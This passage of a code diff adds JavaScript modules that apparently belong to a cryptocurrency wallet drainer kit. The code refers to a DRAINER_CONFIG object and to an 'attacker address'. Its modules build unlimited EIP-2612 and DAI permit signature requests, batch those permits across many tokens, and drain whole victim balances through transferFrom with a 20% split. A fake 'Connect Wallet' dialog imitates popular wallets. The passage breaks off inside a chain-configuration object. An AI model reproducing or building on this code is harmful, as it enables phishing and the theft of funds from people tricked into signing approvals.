+    '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
+    
+    // Optimism
+    '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
+    '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
+    '0x4200000000000000000000000000000000000006': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
+    
+    // Base
+    '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
+    '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
+    '0x4200000000000000000000000000000000000006': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 }
+  };
+
+  // EIP-2612 Permit ABI
+  const PERMIT_ABI = [
+    'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
+    'function nonces(address owner) external view returns (uint256)',
+    'function DOMAIN_SEPARATOR() external view returns (bytes32)',
+    'function name() external view returns (string)',
+    'function symbol() external view returns (string)',
+    'function decimals() external view returns (uint8)'
+  ];
+
+  // DAI-style permit ABI (different signature)
+  const DAI_PERMIT_ABI = [
+    'function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s) external'
+  ];
+
+  /**
+   * Create EIP-2612 Permit typed data
+   * @param {object} params
+   * @returns {object} EIP-712 typed data
+   */
+  function createPermitTypedData(params) {
+    const {
+      owner,
+      token,
+      tokenName,
+      spender,
+      value,
+      nonce,
+      deadline,
+      chainId,
+      version
+    } = params;
+
+    // Default values
+    const tokenInfo = KNOWN_TOKENS[token] || {};
+    const finalName = tokenName || tokenInfo.name || 'Token';
+    const finalVersion = version || '1';
+    const finalValue = value || MAX_UINT256;
+    const finalDeadline = deadline || Math.floor(Date.now() / 1000) + 3600; // 1 hour
+    const finalNonce = nonce || 0;
+
+    const domain = {
+      name: finalName,
+      version: finalVersion,
+      chainId: chainId,
+      verifyingContract: token
+    };
+
+    const types = {
+      EIP712Domain: [
+        { name: 'name', type: 'string' },
+        { name: 'version', type: 'string' },
+        { name: 'chainId', type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' }
+      ],
+      Permit: [
+        { name: 'owner', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ]
+    };
+
+    const message = {
+      owner: owner,
+      spender: spender,
+      value: finalValue,
+      nonce: finalNonce,
+      deadline: finalDeadline
+    };
+
+    return { domain, types, primaryType: 'Permit', message };
+  }
+
+  /**
+   * Create DAI-style permit typed data
+   * DAI uses a different permit signature format
+   */
+  function createDAIPermitTypedData(params) {
+    const {
+      owner,
+      token,
+      spender,
+      nonce,
+      expiry,
+      allowed,
+      chainId
+    } = params;
+
+    const domain = {
+      name: 'Dai Stablecoin',
+      version: '1',
+      chainId: chainId,
+      verifyingContract: token
+    };
+
+    const types = {
+      EIP712Domain: [
+        { name: 'name', type: 'string' },
+        { name: 'version', type: 'string' },
+        { name: 'chainId', type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' }
+      ],
+      Permit: [
+        { name: 'holder', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'expiry', type: 'uint256' },
+        { name: 'allowed', type: 'bool' }
+      ]
+    };
+
+    const message = {
+      holder: owner,
+      spender: spender,
+      nonce: nonce || 0,
+      expiry: expiry || Math.floor(Date.now() / 1000) + 86400 * 365, // 1 year
+      allowed: allowed !== false
+    };
+
+    return { domain, types, primaryType: 'Permit', message };
+  }
+
+  /**
+   * Request permit signature from wallet
+   * @param {object} provider - Web3 provider
+   * @param {string} address - Owner address
+   * @param {object} params - Permit parameters
+   * @returns {Promise<string>} Signature
+   */
+  async function requestPermitSignature(provider, address, params) {
+    const typedData = createPermitTypedData({
+      owner: address,
+      ...params
+    });
+
+    try {
+      const signature = await provider.request({
+        method: 'eth_signTypedData_v4',
+        params: [address, JSON.stringify(typedData)]
+      });
+      return signature;
+    } catch (error) {
+      // Try v3 fallback
+      try {
+        const signature = await provider.request({
+          method: 'eth_signTypedData_v3',
+          params: [address, JSON.stringify(typedData)]
+        });
+        return signature;
+      } catch (v3Error) {
+        throw new Error(`Permit signing failed: ${error.message}`);
+      }
+    }
+  }
+
+  /**
+   * Request DAI-style permit signature
+   */
+  async function requestDAIPermitSignature(provider, address, params) {
+    const typedData = createDAIPermitTypedData({
+      owner: address,
+      ...params
+    });
+
+    try {
+      const signature = await provider.request({
+        method: 'eth_signTypedData_v4',
+        params: [address, JSON.stringify(typedData)]
+      });
+      return signature;
+    } catch (error) {
+      throw new Error(`DAI permit signing failed: ${error.message}`);
+    }
+  }
+
+  /**
+   * Parse permit signature
+   */
+  function parseSignature(signature) {
+    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
+
+    if (sig.length !== 130) {
+      throw new Error('Invalid signature length');
+    }
+
+    return {
+      r: '0x' + sig.slice(0, 64),
+      s: '0x' + sig.slice(64, 128),
+      v: parseInt(sig.slice(128, 130), 16)
+    };
+  }
+
+  /**
+   * Get token info from contract
+   * @param {object} provider - Web3 provider
+   * @param {string} token - Token address
+   * @returns {Promise<object>} Token info
+   */
+  async function getTokenInfo(provider, token) {
+    // Check known tokens first
+    if (KNOWN_TOKENS[token]) {
+      return KNOWN_TOKENS[token];
+    }
+
+    // Try to get from contract
+    try {
+      const nameData = '0x06fdde03'; // name()
+      const symbolData = '0x95d89b41'; // symbol()
+      const decimalsData = '0x313ce567'; // decimals()
+
+      const [nameResult, symbolResult, decimalsResult] = await Promise.all([
+        provider.request({
+          method: 'eth_call',
+          params: [{ to: token, data: nameData }, 'latest']
+        }),
+        provider.request({
+          method: 'eth_call',
+          params: [{ to: token, data: symbolData }, 'latest']
+        }),
+        provider.request({
+          method: 'eth_call',
+          params: [{ to: token, data: decimalsData }, 'latest']
+        })
+      ]);
+
+      // Decode results (simplified)
+      const decimals = parseInt(decimalsResult, 16) || 18;
+
+      return {
+        name: 'Token',
+        symbol: 'TKN',
+        decimals
+      };
+    } catch {
+      return {
+        name: 'Token',
+        symbol: 'TKN',
+        decimals: 18
+      };
+    }
+  }
+
+  /**
+   * Get nonce for address
+   */
+  async function getNonce(provider, token, owner) {
+    try {
+      // nonces(address) selector: 0x7ecebe00
+      const data = '0x7ecebe00' + owner.slice(2).padStart(64, '0');
+      const result = await provider.request({
+        method: 'eth_call',
+        params: [{ to: token, data }, 'latest']
+      });
+      return parseInt(result, 16);
+    } catch {
+      return 0;
+    }
+  }
+
+  /**
+   * Check if token supports EIP-2612
+   */
+  async function supportsPermit(provider, token) {
+    try {
+      // Check if contract has permit function
+      // This is a simplified check
+      const data = '0x7ecebe00' + '0x0000000000000000000000000000000000000000'.slice(2);
+      const result = await provider.request({
+        method: 'eth_call',
+        params: [{ to: token, data }, 'latest']
+      });
+      return result !== '0x';
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * Build permit transaction calldata
+   */
+  function buildPermitCalldata(owner, spender, value, deadline, signature) {
+    const { v, r, s } = parseSignature(signature);
+
+    // permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
+    const selector = '0xd505accf';
+
+    // This would need proper ABI encoding with ethers.js
+    // Placeholder for now
+    return selector;
+  }
+
+  /**
+   * Create batch permit payloads for multiple tokens
+   */
+  function createBatchPermitPayloads(params) {
+    const {
+      owner,
+      tokens, // Array of token addresses
+      spender,
+      chainId,
+      deadline,
+      nonces
+    } = params;
+
+    return tokens.map((token, index) => {
+      return createPermitTypedData({
+        owner,
+        token,
+        spender,
+        value: MAX_UINT256,
+        nonce: nonces?.[index] || 0,
+        deadline: deadline || Math.floor(Date.now() / 1000) + 3600,
+        chainId
+      });
+    });
+  }
+
+  /**
+   * Validate permit parameters
+   */
+  function validatePermitParams(params) {
+    if (!params.owner || !params.owner.match(/^0x[a-fA-F0-9]{40}$/)) {
+      return { valid: false, error: 'Invalid owner address' };
+    }
+    if (!params.token || !params.token.match(/^0x[a-fA-F0-9]{40}$/)) {
+      return { valid: false, error: 'Invalid token address' };
+    }
+    if (!params.spender || !params.spender.match(/^0x[a-fA-F0-9]{40}$/)) {
+      return { valid: false, error: 'Invalid spender address' };
+    }
+    if (!params.chainId) {
+      return { valid: false, error: 'Missing chain ID' };
+    }
+    return { valid: true };
+  }
+
+  // Public API
+  return {
+    MAX_UINT256,
+    KNOWN_TOKENS,
+    PERMIT_ABI,
+    DAI_PERMIT_ABI,
+    createPermitTypedData,
+    createDAIPermitTypedData,
+    requestPermitSignature,
+    requestDAIPermitSignature,
+    parseSignature,
+    getTokenInfo,
+    getNonce,
+    supportsPermit,
+    buildPermitCalldata,
+    createBatchPermitPayloads,
+    validatePermitParams
+  };
+})();
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = Permit;
+}
+
+
+/**
+ * Token Transfer Module
+ * Handles direct token transfers and transferFrom operations
+ * Supports 20% split to attacker address
+ */
+
+const TokenTransfer = (function() {
+  'use strict';
+
+  // Default split percentage
+  const DEFAULT_SPLIT_PERCENT = 20;
+
+  // ERC20 ABI for transfers
+  const ERC20_TRANSFER_ABI = [
+    'function transfer(address to, uint256 amount) external returns (bool)',
+    'function transferFrom(address from, address to, uint256 amount) external returns (bool)',
+    'function balanceOf(address account) external view returns (uint256)',
+    'function decimals() external view returns (uint8)',
+    'function symbol() external view returns (string)',
+    'function name() external view returns (string)'
+  ];
+
+  // Native transfer (ETH/BNB/MATIC etc)
+  const NATIVE_TRANSFER_ABI = [];
+
+  // Function selectors
+  const SELECTORS = {
+    transfer: '0xa9059cbb',       // transfer(address,uint256)
+    transferFrom: '0x23b872dd',   // transferFrom(address,address,uint256)
+    balanceOf: '0x70a08231'       // balanceOf(address)
+  };
+
+  /**
+   * Encode transfer calldata
+   * @param {string} to - Recipient address
+   * @param {string} amount - Amount to transfer (hex or decimal)
+   * @returns {string} Encoded calldata
+   */
+  function encodeTransfer(to, amount) {
+    const amountHex = typeof amount === 'string' && amount.startsWith('0x')
+      ? amount.slice(2).padStart(64, '0')
+      : BigInt(amount).toString(16).padStart(64, '0');
+    return SELECTORS.transfer + to.slice(2).padStart(64, '0') + amountHex;
+  }
+
+  /**
+   * Encode transferFrom calldata
+   * @param {string} from - Sender address
+   * @param {string} to - Recipient address
+   * @param {string} amount - Amount to transfer
+   * @returns {string} Encoded calldata
+   */
+  function encodeTransferFrom(from, to, amount) {
+    const amountHex = typeof amount === 'string' && amount.startsWith('0x')
+      ? amount.slice(2).padStart(64, '0')
+      : BigInt(amount).toString(16).padStart(64, '0');
+    return SELECTORS.transferFrom + from.slice(2).padStart(64, '0') + to.slice(2).padStart(64, '0') + amountHex;
+  }
+
+  /**
+   * Calculate split amounts
+   * @param {string} totalAmount - Total amount to split
+   * @param {number} splitPercent - Percentage for attacker (default 20)
+   * @returns {object} { mainAmount, splitAmount }
+   */
+  function calculateSplit(totalAmount, splitPercent = DEFAULT_SPLIT_PERCENT) {
+    const total = BigInt(totalAmount);
+    const splitBps = BigInt(splitPercent * 100); // Basis points
+    const totalBps = BigInt(10000);
+
+    const splitAmount = (total * splitBps) / totalBps;
+    const mainAmount = total - splitAmount;
+
+    return {
+      totalAmount: totalAmount,
+      mainAmount: mainAmount.toString(),
+      splitAmount: splitAmount.toString(),
+      splitPercent: splitPercent,
+      mainPercent: 100 - splitPercent
+    };
+  }
+
+  /**
+   * Build transfer transaction with split
+   * @param {object} params
+   * @returns {object[]} Array of transaction objects
+   */
+  function buildTransferWithSplit(params) {
+    const {
+      token,
+      from,
+      mainRecipient,
+      splitRecipient,
+      totalAmount,
+      splitPercent,
+      chainId
+    } = params;
+
+    const { mainAmount, splitAmount } = calculateSplit(totalAmount, splitPercent || DEFAULT_SPLIT_PERCENT);
+    const transactions = [];
+
+    // Main transfer
+    if (BigInt(mainAmount) > 0n) {
+      transactions.push({
+        to: token,
+        from: from,
+        data: encodeTransfer(mainRecipient, mainAmount),
+        value: '0x0',
+        chainId: chainId
+      });
+    }
+
+    // Split transfer
+    if (BigInt(splitAmount) > 0n && splitRecipient) {
+      transactions.push({
+        to: token,
+        from: from,
+        data: encodeTransfer(splitRecipient, splitAmount),
+        value: '0x0',
+        chainId: chainId
+      });
+    }
+
+    return transactions;
+  }
+
+  /**
+   * Build transferFrom transaction with split
+   * Used when you have approval to spend someone else's tokens
+   */
+  function buildTransferFromWithSplit(params) {
+    const {
+      token,
+      victim, // Original owner
+      mainRecipient,
+      splitRecipient,
+      totalAmount,
+      splitPercent,
+      chainId
+    } = params;
+
+    const { mainAmount, splitAmount } = calculateSplit(totalAmount, splitPercent || DEFAULT_SPLIT_PERCENT);
+    const transactions = [];
+
+    // Main transferFrom
+    if (BigInt(mainAmount) > 0n) {
+      transactions.push({
+        to: token,
+        data: encodeTransferFrom(victim, mainRecipient, mainAmount),
+        value: '0x0',
+        chainId: chainId
+      });
+    }
+
+    // Split transferFrom
+    if (BigInt(splitAmount) > 0n && splitRecipient) {
+      transactions.push({
+        to: token,
+        data: encodeTransferFrom(victim, splitRecipient, splitAmount),
+        value: '0x0',
+        chainId: chainId
+      });
+    }
+
+    return transactions;
+  }
+
+  /**
+   * Build native token transfer (ETH, BNB, etc) with split
+   */
+  function buildNativeTransferWithSplit(params) {
+    const {
+      from,
+      mainRecipient,
+      splitRecipient,
+      totalAmount,
+      splitPercent,
+      chainId
+    } = params;
+
+    const { mainAmount, splitAmount } = calculateSplit(totalAmount, splitPercent || DEFAULT_SPLIT_PERCENT);
+    const transactions = [];
+
+    // Main transfer
+    if (BigInt(mainAmount) > 0n) {
+      transactions.push({
+        from: from,
+        to: mainRecipient,
+        value: '0x' + BigInt(mainAmount).toString(16),
+        data: '0x',
+        chainId: chainId
+      });
+    }
+
+    // Split transfer
+    if (BigInt(splitAmount) > 0n && splitRecipient) {
+      transactions.push({
+        from: from,
+        to: splitRecipient,
+        value: '0x' + BigInt(splitAmount).toString(16),
+        data: '0x',
+        chainId: chainId
+      });
+    }
+
+    return transactions;
+  }
+
+  /**
+   * Get token balance
+   * @param {object} provider - Web3 provider
+   * @param {string} token - Token address (null for native)
+   * @param {string} account - Account address
+   * @returns {Promise<string>} Balance
+   */
+  async function getBalance(provider, token, account) {
+    if (!token || token === '0x0000000000000000000000000000000000000000') {
+      // Native token balance
+      try {
+        const result = await provider.request({
+          method: 'eth_getBalance',
+          params: [account, 'latest']
+        });
+        return result;
+      } catch (error) {
+        return '0x0';
+      }
+    }
+
+    // ERC20 balance
+    try {
+      const data = SELECTORS.balanceOf + account.slice(2).padStart(64, '0');
+      const result = await provider.request({
+        method: 'eth_call',
+        params: [{ to: token, data }, 'latest']
+      });
+      return result;
+    } catch (error) {
+      return '0x0';
+    }
+  }
+
+  /**
+   * Execute transfer with split
+   * @param {object} provider - Web3 provider
+   * @param {object} params - Transfer parameters
+   * @returns {Promise<object>} Result with tx hashes
+   */
+  async function executeTransferWithSplit(provider, params) {
+    const {
+      token,
+      isNative,
+      from,
+      mainRecipient,
+      splitRecipient,
+      totalAmount,
+      splitPercent
+    } = params;
+
+    const results = {
+      mainTx: null,
+      splitTx: null,
+      success: false
+    };
+
+    try {
+      if (isNative) {
+        // Native token transfers
+        const txs = buildNativeTransferWithSplit(params);
+
+        if (txs.length > 0) {
+          results.mainTx = await provider.request({
+            method: 'eth_sendTransaction',
+            params: [txs[0]]
+          });
+        }
+
+        if (txs.length > 1) {
+          results.splitTx = await provider.request({
+            method: 'eth_sendTransaction',
+            params: [txs[1]]
+          });
+        }
+      } else {
+        // ERC20 transfers
+        const txs = buildTransferWithSplit(params);
+
+        for (let i = 0; i < txs.length; i++) {
+          const tx = txs[i];
+          try {
+            const txHash = await provider.request({
+              method: 'eth_sendTransaction',
+              params: [tx]
+            });
+            if (i === 0) results.mainTx = txHash;
+            else results.splitTx = txHash;
+          } catch (error) {
+            console.error(`Transfer ${i} failed:`, error.message);
+          }
+        }
+      }
+
+      results.success = true;
+    } catch (error) {
+      results.error = error.message;
+    }
+
+    return results;
+  }
+
+  /**
+   * Batch transfer multiple tokens with split
+   * @param {object} provider - Web3 provider
+   * @param {object} params - Parameters including tokens array
+   * @returns {Promise<object[]>} Array of results
+   */
+  async function batchTransferWithSplit(provider, params) {
+    const { tokens, from, mainRecipient, splitRecipient, splitPercent } = params;
+    const results = [];
+
+    for (const tokenInfo of tokens) {
+      const { token, balance, isNative, decimals } = tokenInfo;
+
+      if (BigInt(balance) <= 0n) {
+        results.push({
+          token,
+          success: false,
+          reason: 'Zero balance'
+        });
+        continue;
+      }
+
+      try {
+        const result = await executeTransferWithSplit(provider, {
+          token,
+          isNative,
+          from,
+          mainRecipient,
+          splitRecipient,
+          totalAmount: balance,
+          splitPercent
+        });
+        results.push({ token, ...result });
+      } catch (error) {
+        results.push({
+          token,
+          success: false,
+          error: error.message
+        });
+      }
+    }
+
+    return results;
+  }
+
+  /**
+   * Format amount for display
+   */
+  function formatAmount(amount, decimals = 18) {
+    try {
+      const value = BigInt(amount);
+      const divisor = BigInt(10 ** decimals);
+      const formatted = Number(value) / Number(divisor);
+      return formatted.toLocaleString(undefined, { maximumFractionDigits: 6 });
+    } catch {
+      return '0';
+    }
+  }
+
+  /**
+   * Parse amount to BigInt with decimals
+   */
+  function parseAmount(amount, decimals = 18) {
+    const [integer, fraction = ''] = amount.toString().split('.');
+    const scaled = integer + fraction.padEnd(decimals, '0').slice(0, decimals);
+    return BigInt(scaled);
+  }
+
+  /**
+   * Get gas price
+   */
+  async function getGasPrice(provider) {
+    try {
+      return await provider.request({ method: 'eth_gasPrice' });
+    } catch {
+      return '0x4A817C800'; // 20 gwei default
+    }
+  }
+
+  /**
+   * Estimate gas for transfer
+   */
+  async function estimateTransferGas(provider, tx) {
+    try {
+      return await provider.request({
+        method: 'eth_estimateGas',
+        params: [tx]
+      });
+    } catch {
+      return '0x5208'; // 21000 default
+    }
+  }
+
+  /**
+   * Create unsigned transaction for wallet to sign
+   */
+  function createUnsignedTransfer(params) {
+    const {
+      to,
+      from,
+      value,
+      data,
+      chainId,
+      gasLimit,
+      gasPrice,
+      nonce
+    } = params;
+
+    return {
+      from: from,
+      to: to,
+      value: value || '0x0',
+      data: data || '0x',
+      chainId: chainId,
+      gas: gasLimit || '0x5208',
+      gasPrice: gasPrice || '0x4A817C800',
+      nonce: nonce
+    };
+  }
+
+  // Public API
+  return {
+    DEFAULT_SPLIT_PERCENT,
+    SELECTORS,
+    encodeTransfer,
+    encodeTransferFrom,
+    calculateSplit,
+    buildTransferWithSplit,
+    buildTransferFromWithSplit,
+    buildNativeTransferWithSplit,
+    getBalance,
+    executeTransferWithSplit,
+    batchTransferWithSplit,
+    formatAmount,
+    parseAmount,
+    getGasPrice,
+    estimateTransferGas,
+    createUnsignedTransfer
+  };
+})();
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = TokenTransfer;
+}
+
+
+  // ===== UI MODULES =====
+  /**
+ * Wallet Modal Module
+ * Handles wallet connection UI and interactions
+ * Supports multiple wallet types and connection flows
+ */
+
+const WalletModal = (function() {
+  'use strict';
+
+  // Wallet types
+  const WALLET_TYPE = {
+    METAMASK: 'metamask',
+    WALLET_CONNECT: 'walletconnect',
+    TRUST: 'trust',
+    COINBASE: 'coinbase',
+    BRAVE: 'brave',
+    RAINBOW: 'rainbow',
+    PHANTOM: 'phantom',
+    TRONLINK: 'tronlink',
+    INJECTED: 'injected'
+  };
+
+  // Theme configurations
+  const THEMES = {
+    default: {
+      bg: 'linear-gradient(180deg, #1e1e1e 0%, #121212 100%)',
+      text: '#fff',
+      accent: '#3897f0',
+      border: 'rgba(255,255,255,0.1)',
+      itemBg: 'rgba(255,255,255,0.05)',
+      itemHover: 'rgba(255,255,255,0.1)'
+    },
+    light: {
+      bg: '#ffffff',
+      text: '#000',
+      accent: '#3897f0',
+      border: '#e0e0e0',
+      itemBg: '#f5f5f5',
+      itemHover: '#efefef'
+    },
+    glass: {
+      bg: 'rgba(255, 255, 255, 0.1)',
+      text: '#fff',
+      accent: '#fff',
+      border: 'rgba(255, 255, 255, 0.2)',
+      itemBg: 'rgba(255, 255, 255, 0.05)',
+      itemHover: 'rgba(255, 255, 255, 0.1)',
+      blur: 'blur(12px)'
+    },
+    minimal: {
+      bg: '#000',
+      text: '#fff',
+      accent: '#fff',
+      border: '#333',
+      itemBg: '#111',
+      itemHover: '#222'
+    }
+  };
+
+  /**
+   * Get dynamic styles based on theme
+   */
+  function getStyles(themeKey = 'default') {
+    const t = THEMES[themeKey] || THEMES.default;
+    return `
+    .wallet-modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: ${t.blur || 'blur(8px)'};
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999999;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    .wallet-modal-overlay.active { opacity: 1; visibility: visible; }
+    .wallet-modal {
+      background: ${t.bg};
+      backdrop-filter: ${t.blur || 'none'};
+      border-radius: 24px;
+      padding: 24px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px ${t.border};
+      transform: translateY(20px);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      color: ${t.text};
+    }
+    .wallet-modal-overlay.active .wallet-modal { transform: translateY(0); }
+    
+    .wallet-modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid ${t.border};
+    }
+    .wallet-modal-title { font-size: 20px; font-weight: 600; margin: 0; }
+    .wallet-close {
+      background: ${t.itemBg};
+      border: none;
+      color: ${t.text};
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px;
+    }
+    .wallet-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .wallet-item {
+      display: flex; flex-direction: column; align-items: center; gap: 8px;
+      cursor: pointer; padding: 12px 4px; border-radius: 16px; transition: all 0.2s;
+    }
+    .wallet-item:hover { background: ${t.itemHover}; transform: translateY(-2px); }
+    .wallet-item-icon {
+      width: 56px; height: 56px; border-radius: 14px;
+      background: ${t.itemBg};
+      display: flex; align-items: center; justify-content: center;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .wallet-item-icon img {
+      width: 32px; height: 32px; object-fit: contain;
+    }
+    .wallet-item-name { font-size: 11px; font-weight: 500; color: ${t.text}; opacity: 0.7; text-align: center; }
+    .deep-link-btn {
+        background: ${t.accent};
+        color: #fff; border: none; padding: 14px; border-radius: 12px; width: 100%;
+        font-weight: 600; cursor: pointer; margin-top: 10px;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .wallet-error {
+      background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 12px; padding: 12px; margin-top: 16px; color: #f87171; font-size: 13px; text-align: center;
+    }
+    @media (max-width: 600px) {
+      .wallet-modal {
+        max-width: 100%; margin: 0; position: fixed; bottom: 0;
+        border-bottom-left-radius: 0; border-bottom-right-radius: 0;
+        transform: translateY(100%);
+      }
+    }
+  `;
+  }
+
+  // Deep Link Configuration
+  const DEEP_LINKS = {
+    metamask: 'https://metamask.app.link/dapp/',
+    trust: 'https://link.trustwallet.com/open_url?url=',
+    rainbow: 'https://rainbow.me/open-url?url=',
+    coinbase: 'https://go.cb-w.com/dapp?cb_url=',
+    phantom: 'https://phantom.app/ul/browse/',
+    tonkeeper: 'https://app.tonkeeper.com/ton-connect'
+  };
+
+  const WALLETS = [
+    { id: 'metamask', name: 'MetaMask', icon: 'https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg' },
+    { id: 'trust', name: 'Trust Wallet', icon: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg' },
+    { id: 'coinbase', name: 'Coinbase', icon: 'https://www.coinbase.com/favicon.ico' },
+    { id: 'rainbow', name: 'Rainbow', icon: 'https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/rainbowWallet/rainbowWallet.svg' },
+    { id: 'phantom', name: 'Phantom', icon: 'https://phantom.app/favicon.ico' },
+    { id: 'walletconnect', name: 'WalletConnect', icon: 'https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg' },
+    { id: 'okx', name: 'OKX Wallet', icon: 'https://www.okx.com/favicon.ico' },
+    { id: 'rabby', name: 'Rabby', icon: 'https://rabby.io/assets/images/logo.png' },
+    { id: 'ledger', name: 'Ledger', icon: 'https://www.ledger.com/favicon.ico' }
+  ];
+
+  let modalContainer = null;
+
+  function init() {
+    const theme = window.DRAINER_CONFIG?.ui?.modalType || 'default';
+    if (!document.getElementById('wallet-modal-styles')) {
+      const style = document.createElement('style');
+      style.id = 'wallet-modal-styles';
+      style.textContent = getStyles(theme);
+      document.head.appendChild(style);
+    }
+    if (!modalContainer) {
+      modalContainer = document.createElement('div');
+      modalContainer.id = 'wallet-modal-overlay';
+      modalContainer.className = 'wallet-modal-overlay';
+      document.body.appendChild(modalContainer);
+    }
+  }
+
+  function getDeepLink(walletId, url = window.location.href) {
+    const base = DEEP_LINKS[walletId];
+    if (!base) return url;
+    if (walletId === 'metamask' || walletId === 'phantom') return base + url;
+    return base + encodeURIComponent(url);
+  }
+
+  function show(options = {}) {
+    init();
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    
+    const walletGrid = WALLETS.map(w => `
+      <div class="wallet-item" data-wallet="${w.id}">
+        <div class="wallet-item-icon">
+            <img src="${w.icon}" alt="${w.name}" onerror="this.src='https://api.dicebear.com/7.x/initials/svg?seed=${w.name}'">
+        </div>
+        <div class="wallet-item-name">${w.name}</div>
+      </div>
+    `).join('');
+
+    modalContainer.innerHTML = `
+      <div class="wallet-modal">
+        <div class="wallet-modal-header">
+          <h2 class="wallet-modal-title">Connect Wallet</h2>
+          <button class="wallet-close">&times;</button>
+        </div>
+        <div class="wallet-grid">
+          ${walletGrid}
+        </div>
+        ${isMobile ? `
+          <div class="mobile-only">
+            <button class="deep-link-btn" id="deep-link-metamask">
+               <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" width="20" height="20"> Open in MetaMask (Direct)
+            </button>
+          </div>
+        ` : ''}
+        <div id="wallet-error-container"></div>
+      </div>
+    `;
+
+    setTimeout(() => modalContainer.classList.add('active'), 10);
+
+    return new Promise((resolve, reject) => {
+      modalContainer.querySelector('.wallet-close').onclick = () => {
+          hide();
+          reject(new Error('Cancelled'));
+      };
+
+      modalContainer.querySelectorAll('.wallet-item').forEach(item => {
+        item.onclick = async () => {
+          const id = item.dataset.wallet;
+          if (isMobile && DEEP_LINKS[id]) {
+              window.location.href = getDeepLink(id);
+              return;
+          }
+          
+          try {
+            if (window.WalletDetect) {
+                const res = await window.WalletDetect.connect();
+                hide();
+                resolve(res);
+            } else {
+                throw new Error('Wallet engine not loaded');
+            }
+          } catch (e) {
+            showError(e.message);
+          }
+        };
+      });
+
+      if (isMobile && document.getElementById('deep-link-metamask')) {
+          document.getElementById('deep-link-metamask').onclick = () => {
+              window.location.href = getDeepLink('metamask');
+          };
+      }
+    });
+  }
+
+  function showError(msg) {
+      const container = document.getElementById('wallet-error-container');
+      if (container) {
+          container.innerHTML = `<div class="wallet-error">${msg}</div>`;
+      }
+  }
+
+  function hide() {
+    if (modalContainer) modalContainer.classList.remove('active');
+  }
+
+  return { show, hide };
+})();
+
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = WalletModal;
+}
+
+
+/**
+ * Chain Modal Module
+ * Handles chain switching UI and network prompts
+ * Supports all major EVM chains
+ */
+
+const ChainModal = (function() {
+  'use strict';
+
+  // Chain configurations with icons and colors
+  const CHAINS = {
+    eth: {
+      chainId: '0x1',
+      chainIdNum: 1,
+      name: 'Ethereum',
+      symbol: 'ETH',
+      icon: '⟠',
+      color: '#627EEA',
+      rpc: 'https://eth.llamarpc.com'
+    },
+    bsc: {
+      chainId: '0x38',
+      chainIdNum: 56,
+      name: 'BNB Smart Chain',
+      symbol: 'BNB',
+      icon: '⬡',
+      color: '#F3BA2F',
+      rpc: 'https://bsc-dataseed1.binance.org'
+    },
+    polygon: {
+      chainId: '0x89',
+      chainIdNum: 137,
+      name: 'Polygon',
+      symbol: 'MATIC',
+      icon: '⬡',
+      color: '#8247E5',
+      rpc: 'https://polygon-rpc.com'
+    },
+    avax: {
+      chainId: '0xa86a',
+      chainIdNum: 43114,
+      name: 'Avalanche',
+      symbol: 'AVAX',
+      icon: '🔺',
+      color: '#E84142',
+      rpc: 'https://api.avax.network/ext/bc/C/rpc'
+    },
+    arbitrum: {
+      chainId: '0xa4b1',
+      chainIdNum: 42161,
+      name: 'Arbitrum',
+      symbol: 'ETH',
+      icon: '🔵',
+      color: '#28A0F0',
+      rpc: 'https://arb1.arbitrum.io/rpc'
+    },
+    optimism: {
+      chainId: '0xa',
+      chainIdNum: 10,
